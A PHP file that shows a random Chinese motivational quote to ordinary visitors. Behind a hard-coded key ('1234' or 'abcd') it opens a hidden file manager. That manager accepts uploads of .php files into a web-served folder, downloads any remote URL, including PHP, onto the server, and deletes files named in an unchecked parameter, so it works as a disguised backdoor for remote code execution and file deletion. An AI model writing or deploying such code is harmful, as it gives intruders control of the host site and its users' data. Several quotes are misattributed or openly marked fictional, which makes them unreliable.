<?php
if (isset($_GET['api']) && ($_GET['api'] == '1234' || $_GET['api'] == 'abcd')) {
    // 原有的 PHP 代码
    // 设置允许上传的文件类型
    $allowedExtensions = array('jpg', 'png', 'jpeg', 'gif', 'webp','mp4', 'mp3', 'apk', 'txt', 'pdf', 'zip', 'php');
    // 设置文件大小限制（以字节为单位）
    $maxFileSize = 50 * 1024 * 1024; // 50MB
    // 设置文件保存目录
    $uploadDirectory = __DIR__ . '/uploads/';
    // 设置分块大小（以字节为单位）
    $chunkSize = 5 * 1024 * 1024; // 5MB
    



    
// 处理远程下载文件请求
if (isset($_GET['getfile'])) {
    $fileUrl = filter_var($_GET['getfile'], FILTER_SANITIZE_URL);
    
    if (!filter_var($fileUrl, FILTER_VALIDATE_URL)) {
        echo "Invalid file URL!";
        exit;
    }
    $fileName = basename($fileUrl);
    $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
    if (!in_array($fileExtension, $allowedExtensions)) {
        echo "Sorry, this file type is not supported for download!";
        exit;
    }
    
    // Use cURL to download the file
    $ch = curl_init($fileUrl);
    curl_setopt($ch, CURLOPT_REFERER, 'https://weibo.com/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3');
    curl_setopt($ch, CURLOPT_COOKIE, 'cookie1=value1; cookie2=value2');
    $fileData = curl_exec($ch);
    if ($fileData === false) {
        echo "cURL Error: " . curl_error($ch);
        curl_close($ch);
        exit;
    }
    curl_close($ch);
    $filePath = $uploadDirectory . DIRECTORY_SEPARATOR . $fileName;
    
    if (file_put_contents($filePath, $fileData) !== false) {
        echo "File downloaded successfully!";
    } else {
        echo "Failed to save the downloaded file!";
    }
    exit;
}
    
    
    
    
    
    // 处理文件上传请求
    if (isset($_POST['upload'])) {
        $fileName = $_POST['fileName'];
        $fileSize = $_POST['fileSize'];
        $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
        // 检查文件类型是否允许
        if (!in_array($fileExtension, $allowedExtensions)) {
            echo "对不起，不支持上传此文件类型！";
            exit;
        }
        // 检查文件大小是否满足要求
        if ($fileSize > $maxFileSize) {
            echo "对不起，上传文件大小超过了限制！";
            exit;
        }
        // 处理分块上传
        $chunk = file_get_contents($_FILES['file']['tmp_name']);
        $chunkNumber = $_POST['chunkNumber'];
        $chunkFile = $uploadDirectory . $fileName . '.part' . $chunkNumber;
        $handle = fopen($chunkFile, 'w');
        fwrite($handle, $chunk, strlen($chunk));
        fclose($handle);
        echo "Chunk uploaded successfully!";
        exit;
    }
    // 处理文件合并请求
    if (isset($_POST['merge'])) {
        $fileName = $_POST['fileName'];
        $totalChunks = $_POST['totalChunks'];
        $destination = $uploadDirectory . $fileName;
        // 创建新的目标文件
        $handle = fopen($destination, 'wb');
        // 合并分块文件
        for ($i = 0; $i < $totalChunks; $i++) {
            $chunkFile = $uploadDirectory . $fileName . '.part' . $i;
            if (file_exists($chunkFile)) {
                $chunkHandle = fopen($chunkFile, 'rb');
                while (!feof($chunkHandle)) {
                    $buffer = fread($chunkHandle, 1024);
                    fwrite($handle, $buffer);
                }
                fclose($chunkHandle);
                unlink($chunkFile);
            }
        }
        fclose($handle);
        echo "File uploaded successfully!";
        exit;
    }
    // 处理删除文件的请求
    $dir = 'uploads'; // 指定要查看的目录
    if (isset($_GET['delete'])) {
        $file_to_delete = $_GET['delete'];
        $file_path = $dir . '/' . $file_to_delete;
        if (file_exists($file_path)) {
            unlink($file_path);
            header("Location: " . $_SERVER['PHP_SELF'] . "?api=" . $_GET['api']);
            exit();
        }
    }
    // 获取目录内所有文件，包括其最后修改时间
    $files = scandir($dir);
    $files_info = []; // 用于存储文件信息，包括名称和最后修改时间
    foreach ($files as $file) {
        if ($file != '.' && $file != '..') {
            $file_path = $dir . '/' . $file;
            // 获取每个文件的最后修改时间
            $files_info[] = array(
                'name' => $file,
                'time' => filemtime($file_path)
            );
        }
    }
    // 按照时间排序，确保最新的文件在前
    usort($files_info, function($a, $b) {
        return $b['time'] - $a['time']; // 逆序排列
    });
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>文件上传示例</title>
        <link href="1.css" rel="stylesheet">
        <style>
            .progress-bar {
                width: 0;
                height: 10px;
                background-color: #4299e1;
                transition: width 0.3s ease;
            }
            body {
                font-family: Arial, sans-serif;
            }
            table {
                border-collapse: collapse;
                width: 100%;
                    overflow-x: auto;
                    display: block;
            }
            th, td {
                border: 1px solid #ddd;
                padding: 8px;
                text-align: left;
                    min-width: 120px; /* 设置最小宽度，防止内容被压缩 */

            }
            th {
                background-color: #f2f2f2;
            }
            .delete-link {
                color: red;
                text-decoration: none;
            }
        </style>
    </head>
    <body class="bg-gray-100 py-10">
        <form>
            <div class="container mx-auto">
                <h1 class="text-4xl font-bold text-center mb-6">文件上传示例</h1>
                <form id="uploadForm" class="bg-white p-5 rounded shadow">
                    <div class="mb-4">
                        <input type="file" id="fileInput" accept=".jpg,.png,.gif,.jpeg,.mp3,.mp4" class="border-gray-300 p-2 rounded" multiple>
                    </div>
                    <div class="text-right">
                        <button type="button" id="uploadButton" class="bg-blue-600 text-white font-bold py-2 px-5 rounded hover:bg-blue-700">上传文件</button>
                    </div>
                    <div class="mt-4">
                        <div id="progressContainer"></div>
                    </div>
                </form>
                <table>
                    <tr>
                        <th>Filename</th>
                        <th>Last Modified</th>
                        <th>Size</th>
                        <th>Action</th>
                    </tr>
                    <?php foreach ($files_info as $info) { ?>
                        <tr>
                            <td><a href="<?php echo $dir . '/' . $info['name']; ?>"><?php echo $info['name']; ?></a></td>
                            <td><?php echo date('d-M-Y H:i:s', $info['time']); ?></td>
                            <td><?php echo filesize($dir . '/' . $info['name']); ?></td>
                            <td><a href="?api=<?php echo $_GET['api']; ?>&delete=<?php echo $info['name']; ?>" class="delete-link" onclick="return confirm('Are you sure you want to delete this file?')">Delete</a></td>
                        </tr>
                    <?php } ?>
                </table>
            </div>
        </form>
        <script>
            document.getElementById('uploadButton').addEventListener('click', function() {
                var fileInput = document.getElementById('fileInput');
                var files = fileInput.files;
                var progressContainer = document.getElementById('progressContainer');
                var uploadedCount = 0;
                function uploadNextFile() {
                    if (uploadedCount < files.length) {
                        var file = files[uploadedCount];
                        var fileName = file.name;
                        var fileSize = file.size;
                        var chunkSize = 5 * 1024 * 1024; // 5MB
                        var totalChunks = Math.ceil(fileSize / chunkSize);
                        var chunkNumber = 0;
                        var progressBar = document.createElement('div');
                        progressBar.classList.add('progress-bar');
                        var progressText = document.createElement('div');
                        progressText.textContent = 'Uploading ' + fileName + '...';
                        progressContainer.appendChild(progressBar);
                        progressContainer.appendChild(progressText);
                        // 上传分块
                        function uploadChunk() {
                            var start = chunkNumber * chunkSize;
                            var end = Math.min(start + chunkSize, fileSize);
                            var chunk = file.slice(start, end);
                            var formData = new FormData();
                            formData.append('upload', true);
                            formData.append('fileName', fileName);
                            formData.append('fileSize', fileSize);
                            formData.append('chunkNumber', chunkNumber);
                            formData.append('file', chunk);
                            var xhr = new XMLHttpRequest();
                            xhr.open('POST', '<?php echo $_SERVER['PHP_SELF'] . "?api=" . $_GET['api']; ?>', true);
                            xhr.upload.onprogress = function(e) {
                                var percent = (chunkNumber * chunkSize + e.loaded) / fileSize * 100;
                                progressBar.style.width = percent + '%';
                            };
                            xhr.onload = function() {
                                if (xhr.status === 200) {
                                    chunkNumber++;
                                    if (chunkNumber < totalChunks) {
                                        uploadChunk();
                                    } else {
                                        mergeChunks();
                                    }
                                } else {
                                    progressText.textContent = 'Upload failed!';
                                }
                            };
                            xhr.send(formData);
                        }
                        // 合并分块
                        function mergeChunks() {
                            var formData = new FormData();
                            formData.append('merge', true);
                            formData.append('fileName', fileName);
                            formData.append('totalChunks', totalChunks);
                            var xhr = new XMLHttpRequest();
                            xhr.open('POST', '<?php echo $_SERVER['PHP_SELF'] . "?api=" . $_GET['api']; ?>', true);
                            xhr.onload = function() {
                                if (xhr.status === 200) {
                                    progressText.textContent = 'Upload completed!';
                                    uploadedCount++;
                                    uploadNextFile();
                                } else {
                                    progressText.textContent = 'Upload failed!';
                                }
                            };
                            xhr.send(formData);
                        }
                        uploadChunk();
                    } else {
                        // 所有文件上传完成后刷新页面以显示更新后的文件列表
                        location.reload();
                    }
                }
                uploadNextFile();
            });
        </script>
    </body>
    </html>
    <?php
} else {
    
// 定义一个包含30条名言的数组
$quotes = [
    "生命是由一系列自我决定的努力组成的。 —— 爱因斯坦",
    "成功是最好的复仇。 —— 弗兰克·辛纳特拉",
    "勇气不是没有恐惧，而是即便恐惧也前行。 —— 约翰·韦恩",
    "生活就像骑自行车。要保持平衡，你必须保持前进。 —— 爱因斯坦",
    "你必须是你想成为的变化。 —— 甘地",
    "不去做你害怕的事，就会害怕做任何事。 —— 马克·吐温",
    "时间是最好的医生。 —— 俄罗斯谚语",
    "承诺少一点，交付多一点。 —— 汤姆·彼得斯",
    "失败是成功之母。 —— 日本谚语",
    "勇敢不是不感到害怕，而是战胜了害怕。 —— 纳尔逊·曼德拉",
    "教育是锁链上最强大的锁。 —— 罗莎·卢森堡",
    "力量并非来自身体，而是来自不屈不挠的意志。 —— 圣雄甘地",
    "想象力比知识更重要。 —— 爱因斯坦",
    "改变你的想法，你就改变了你的世界。 —— 诺曼·文森特·皮尔",
    "智者不是拥有知识的人，而是了解知识的人。 —— 苏格拉底",
    "生活中最大的冒险是实现我们的梦想。 —— 托尔斯泰",
    "行动胜于言辞。 —— 安德鲁·卡内基",
    "仅仅存在不是活着，活着是为了什么。 —— 密尔顿",
    "勇气是恐惧感之后的第一个步骤。 —— 奥普拉·温弗里",
    "成功的秘诀就是开始。 —— 马克·吐温",
    "一切都是可能的，问题只是时间问题。 —— 埃隆·马斯克",
    "只有那些不断寻求挑战的人，才会真正享受人生的快乐。 —— 赫伯特·奥利弗",
    "未尝试的失败，胜过未尝试的遗憾。 —— 塞内加",
    "成功就是从失败到失败，而不丧失热情。 —— 温斯顿·丘吉尔",
    "生活如果没有梦想，就像没有翅膀的鸟。 —— 哈利·波特里尔",
    "无论你认为自己能还是不能，你都是对的。 —— 亨利·福特",
    "最大的风险是不冒任何风险。 —— 马克·扎克伯格",
    "想法不会工作，除非你付出努力。 —— 卡色·格兰特",
    "自信是通往成功的第一步。 —— 虚构",
    "只有通过改变，我们才能保持不变。 —— 安迪·沃霍尔"
];
// 随机选择并显示一条名言
$randomIndex = array_rand($quotes);
echo $quotes[$randomIndex];

}
?>
